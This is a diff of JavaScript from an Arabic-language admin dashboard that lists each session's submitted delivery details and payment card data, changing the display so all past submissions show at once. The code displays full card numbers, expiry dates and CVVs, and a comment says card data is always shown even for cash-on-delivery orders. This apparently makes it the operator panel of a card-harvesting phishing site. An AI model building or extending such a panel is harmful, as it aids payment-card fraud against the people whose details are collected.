@@ -1620,56 +1620,42 @@ function buildDeliverySection(data, allSubmissions = [], sessionId = '') {
   
   let html = '<div class="card-section delivery-section" style="padding:12px;">';
   
-  // Title with count and dropdown toggle
+  // Title
   const count = submissions.length;
   const hasHistory = count > 1;
-  const countLabel = hasHistory ? count + ' إرسالات' : 'إرسال واحد';
-  const arrowIcon = hasHistory ? '▼' : '';
   
-  html += '<div class="section-title delivery-history-toggle" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="toggleDeliveryHistory(\'' + sessionId + '\')"' : '') + '>';
+  html += '<div class="section-title" style="margin-bottom:10px;display:flex;align-items:center;gap:8px;">';
   html += '<span>📦</span> بيانات التوصيل';
-  html += '<span style="margin-right:auto;font-size:12px;color:var(--primary-light);font-weight:600;">' + countLabel + '</span>';
-  html += '<span style="font-size:11px;color:#9ca3af;">' + arrowIcon + '</span>';
+  if (hasHistory) {
+    html += '<span style="margin-right:auto;font-size:11px;color:var(--primary-light);font-weight:600;background:rgba(59,130,246,0.15);padding:2px 8px;border-radius:10px;">' + count + ' إرسالات</span>';
+  }
   html += '</div>';
   
-  // Show current (latest) delivery
-  if (submissions.length > 0) {
-    const current = submissions[0];
-    const currentData = current.data;
+  // Show ALL submissions (newest first) - always visible
+  submissions.forEach((sub, idx) => {
+    const subData = sub.data;
+    const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : (idx === 0 ? 'الأحدث' : '#' + (idx + 1));
+    const isLatest = idx === 0;
     
-    html += '<div id="deliveryCurrent_' + sessionId + '" class="delivery-current">';
+    // Badge for submission number
+    const badgeColor = isLatest ? 'background:#10b981;' : 'background:rgba(59,130,246,0.15);color:var(--primary-light);';
+    const borderStyle = isLatest ? 'border:2px solid #10b981;' : 'border:1px solid rgba(59,130,246,0.2);';
+    
+    html += '<div style="padding:10px;margin-bottom:8px;border-radius:8px;' + borderStyle + '">';
+    html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
+    html += '<span style="font-size:10px;padding:2px 8px;border-radius:10px;' + badgeColor + 'font-weight:600;">' + (isLatest ? '✓ الحالي' : timestamp) + '</span>';
+    if (!isLatest) {
+      html += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
+    }
+    html += '</div>';
     html += '<div class="data-grid">';
-    if (currentData.fullName) html += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(currentData.fullName) + '</span></div>';
-    if (currentData.phone) html += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(currentData.phone) + '</span></div>';
-    if (currentData.email) html += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(currentData.email) + '</span></div>';
-    if (currentData.city) html += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(currentData.city) + '</span></div>';
-    if (currentData.address) html += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(currentData.address) + '</span></div>';
+    if (subData.fullName) html += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(subData.fullName) + '</span></div>';
+    if (subData.phone) html += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(subData.phone) + '</span></div>';
+    if (subData.email) html += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(subData.email) + '</span></div>';
+    if (subData.city) html += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(subData.city) + '</span></div>';
+    if (subData.address) html += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(subData.address) + '</span></div>';
     html += '</div></div>';
-  }
-  
-  // History dropdown (for older submissions)
-  if (hasHistory) {
-    let historyItems = '';
-    submissions.slice(1).forEach((sub, idx) => {
-      const subData = sub.data;
-      const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
-      
-      historyItems += '<div class="delivery-history-item" style="padding:10px;background:rgba(59,130,246,0.08);border-radius:8px;margin-bottom:8px;border:1px solid rgba(59,130,246,0.2);">';
-      historyItems += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
-      historyItems += '<span style="font-size:11px;color:var(--primary-light);font-weight:600;">الإرسال #' + (idx + 2) + '</span>';
-      historyItems += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
-      historyItems += '</div>';
-      historyItems += '<div class="data-grid">';
-      if (subData.fullName) historyItems += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(subData.fullName) + '</span></div>';
-      if (subData.phone) historyItems += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(subData.phone) + '</span></div>';
-      if (subData.email) historyItems += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(subData.email) + '</span></div>';
-      if (subData.city) historyItems += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(subData.city) + '</span></div>';
-      if (subData.address) historyItems += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(subData.address) + '</span></div>';
-      historyItems += '</div></div>';
-    });
-    
-    html += '<div id="deliveryHistory_' + sessionId + '" class="delivery-history-dropdown" style="margin-top:10px;display:none;">' + historyItems + '</div>';
-  }
+  });
   
   html += '</div>';
   return html;
@@ -1702,88 +1688,57 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
   
   let html = '<div class="card-section payment-section" style="padding:12px;">';
   
-  // Title with count and dropdown toggle
+  // Title
   const count = submissions.length;
   const hasHistory = count > 1;
-  const countLabel = hasHistory ? count + ' مدفوعات' : '1 دفعة';
-  const arrowIcon = hasHistory ? '▼' : '';
   
-  html += '<div class="section-title payment-history-toggle" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="togglePaymentHistory(\'' + sessionId + '\')"' : '') + '>';
+  html += '<div class="section-title" style="margin-bottom:10px;display:flex;align-items:center;gap:8px;">';
   html += '<span>💳</span> بيانات الدفع';
-  html += '<span style="margin-right:auto;font-size:12px;color:var(--success);font-weight:600;">' + countLabel + '</span>';
-  html += '<span style="font-size:11px;color:#9ca3af;">' + arrowIcon + '</span>';
+  if (hasHistory) {
+    html += '<span style="margin-right:auto;font-size:11px;color:var(--success);font-weight:600;background:rgba(16,185,129,0.15);padding:2px 8px;border-radius:10px;">' + count + ' مدفوعات</span>';
+  }
   html += '</div>';
   
-  // Show current (latest) payment
-  if (submissions.length > 0) {
-    const current = submissions[0];
-    const currentData = current.data;
-    const cardNum = currentData.cardNumber || currentData.card_number || '';
-    const cvv = currentData.cvv || '';
-    const isCash = currentData.paymentMethod === 'cash';
+  // Show ALL submissions (newest first) - always visible
+  submissions.forEach((sub, idx) => {
+    const subData = sub.data;
+    const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : (idx === 0 ? 'الأحدث' : '#' + (idx + 1));
+    const isLatest = idx === 0;
+    const cardNum = subData.cardNumber || subData.card_number || '';
+    const cvv = subData.cvv || '';
+    const isCash = subData.paymentMethod === 'cash';
     
-    html += '<div id="paymentCurrent_' + sessionId + '" class="payment-current">';
+    // Badge for submission number
+    const badgeColor = isLatest ? 'background:#10b981;' : 'background:rgba(107,114,128,0.15);color:#9ca3af;';
+    const borderStyle = isLatest ? 'border:2px solid #10b981;' : 'border:1px solid rgba(255,255,255,0.1);';
     
-    // Always show card data (even for cash payments)
+    html += '<div style="padding:10px;margin-bottom:8px;border-radius:8px;' + borderStyle + '">';
+    html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
+    html += '<span style="font-size:10px;padding:2px 8px;border-radius:10px;' + badgeColor + 'font-weight:600;">' + (isLatest ? '✓ الحالي' : timestamp) + '</span>';
+    if (!isLatest) {
+      html += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
+    }
+    if (isCash) {
+      html += '<span style="font-size:10px;padding:2px 8px;background:#10b981;color:white;border-radius:10px;font-weight:600;">💵</span>';
+    }
+    html += '</div>';
+    
+    // Always show card data (even for cash)
     html += '<div class="data-grid">';
-    if (cardNum) {
-      html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
-    }
-    if (currentData.cardHolder) {
-      html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(currentData.cardHolder) + '</span></div>';
-    }
-    if (currentData.expiry) {
-      html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(currentData.expiry) + '</span></div>';
-    }
-    if (cvv) {
-      html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
-    }
+    if (cardNum) html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
+    if (subData.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(subData.cardHolder) + '</span></div>';
+    if (subData.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(subData.expiry) + '</span></div>';
+    if (cvv) html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
     html += '</div>';
     
     // Show payment method badge
     if (isCash) {
-      html += '<div style="margin-top:8px;padding:6px 10px;background:#10b981;border-radius:6px;color:white;text-align:center;font-size:12px;font-weight:600;">';
+      html += '<div style="margin-top:6px;padding:4px 8px;background:#10b981;border-radius:4px;color:white;text-align:center;font-size:11px;font-weight:600;">';
       html += '💵 دفع عند الاستلام - 25 ر.ق';
       html += '</div>';
     }
-    
     html += '</div>';
-  }
-  
-  // History dropdown (for older submissions)
-  if (hasHistory) {
-    let historyItems = '';
-    submissions.slice(1).forEach((sub, idx) => {
-      const subData = sub.data;
-      const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
-      const cardNum = subData.cardNumber || subData.card_number || '';
-      const cvv = subData.cvv || '';
-      const isCash = subData.paymentMethod === 'cash';
-      
-      historyItems += '<div class="payment-history-item" style="padding:10px;background:rgba(107,114,128,0.15);border-radius:8px;margin-bottom:8px;border:1px solid rgba(255,255,255,0.1);">';
-      historyItems += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
-      historyItems += '<span style="font-size:11px;color:#9ca3af;font-weight:600;">' + (isCash ? '💵 #' + (idx + 2) : 'البطاقة #' + (idx + 2)) + '</span>';
-      historyItems += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
-      historyItems += '</div>';
-      
-      // Always show card data (even for cash)
-      historyItems += '<div class="data-grid">';
-      if (cardNum) historyItems += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
-      if (subData.cardHolder) historyItems += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(subData.cardHolder) + '</span></div>';
-      if (subData.expiry) historyItems += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(subData.expiry) + '</span></div>';
-      if (cvv) historyItems += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
-      historyItems += '</div>';
-      
-      if (isCash) {
-        historyItems += '<div style="margin-top:6px;padding:4px 8px;background:#10b981;border-radius:4px;color:white;text-align:center;font-size:11px;font-weight:600;">';
-        historyItems += '💵 دفع عند الاستلام - 25 ر.ق';
-        historyItems += '</div>';
-      }
-      historyItems += '</div>';
-    });
-    
-    html += '<div id="paymentHistory_' + sessionId + '" class="payment-history-dropdown" style="margin-top:10px;display:none;">' + historyItems + '</div>';
-  }
+  });
   
   html += '</div>';
   return html;
